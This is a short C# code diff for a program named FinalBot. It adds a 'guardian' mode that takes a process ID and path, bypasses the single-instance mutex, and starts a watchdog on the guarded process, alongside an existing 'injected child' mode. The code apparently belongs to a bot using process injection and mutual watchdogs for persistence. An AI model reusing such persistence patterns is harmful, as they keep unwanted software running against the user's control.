@@ -46,10 +46,26 @@ namespace FinalBot
             
             bool isInjected = ElevationService.IsInjected();
             int fromPid = 0;
+            string fromPath = "";
+            
             string fromArg = Array.Find(args, a => a.StartsWith("--from="));
             if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;
 
-            if (!isInjected)
+            string guardianArg = Array.Find(args, a => a.StartsWith("--guardian="));
+            if (guardianArg != null)
+            {
+                // Format: --guardian=PID:Path
+                var parts = guardianArg.Split('=')[1].Split(':');
+                if (parts.Length >= 2 && int.TryParse(parts[0], out var gPid))
+                {
+                    fromPid = gPid;
+                    fromPath = parts[1];
+                    // On systems like Windows, paths might contain colons (C:\), so we rejoin if needed
+                    if (parts.Length > 2) fromPath = string.Join(":", parts, 1, parts.Length - 1);
+                }
+            }
+
+            if (!isInjected && guardianArg == null)
             {
                 bool createdNew;
                 string mutexName = GetStableMutexName();
@@ -80,8 +96,12 @@ namespace FinalBot
             }
             else
             {
-                DebugLog($"Running as INJECTED child from PID {fromPid}.");
-                if (fromPid > 0) WatchdogManager.Start(fromPid);
+                DebugLog($"Running as {(isInjected ? "INJECTED" : "GUARDIAN")} child from PID {fromPid}.");
+                if (fromPid > 0) 
+                {
+                    // WatchdogManager now requires the path to the process it's guarding
+                    WatchdogManager.Start(fromPid, fromPath);
+                }
             }
 
             try { ResourceModule.ExtractAll(); }
